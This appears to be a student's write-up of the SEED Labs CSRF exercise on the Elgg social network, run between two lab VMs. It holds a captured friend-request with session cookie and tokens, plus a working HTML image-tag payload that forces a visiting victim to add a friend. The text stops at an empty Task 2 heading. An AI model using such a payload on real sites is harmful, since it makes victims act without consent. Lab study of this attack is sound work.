---
title: Cross-Site Request Forgery Lab
author: Xinyi Li
date: \today{}
---

Instruction: https://seedsecuritylabs.org/Labs_16.04/PDF/Web_CSRF_Elgg.pdf

# Set-up

2 VMs:

- attacker: `10.0.2.15`
- server: `10.0.2.4`

Edit the DNS records in `/etc/hosts` on both the attacker and the server:

```
10.0.2.4       www.csrflabelgg.com
10.0.2.15       www.csrflabattacker.com
```

# Task 1

Capture a legitimate friend request from Alice:

```
http://www.csrflabelgg.com/action/friends/add?friend=43&__elgg_ts=1589690725&__elgg_token=Irq1Au9aMYevG7DW46dbHw&__elgg_ts=1589690725&__elgg_token=Irq1Au9aMYevG7DW46dbHw
GET /action/friends/add?friend=43&__elgg_ts=1589690725&__elgg_token=Irq1Au9aMYevG7DW46dbHw&__elgg_ts=1589690725&__elgg_token=Irq1Au9aMYevG7DW46dbHw HTTP/1.1
Host: www.csrflabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.csrflabelgg.com/profile/boby
X-Requested-With: XMLHttpRequest
Cookie: Elgg=btc2fee9599em32h7tc646bi83
Connection: keep-alive
```

Create a web page as [msg.html](./msg.html):

```html
<html>
    <body>
        <img src = "http://www.csrflabelgg.com/action/friends/add?friend=43"/>
    </body>
</html>
```

And put it into `/var/www/CSRF/Attacker` folder.

Then, send Alice a message that contains the URL: http://www.csrflabattacker.com/msg.html

# Task 2





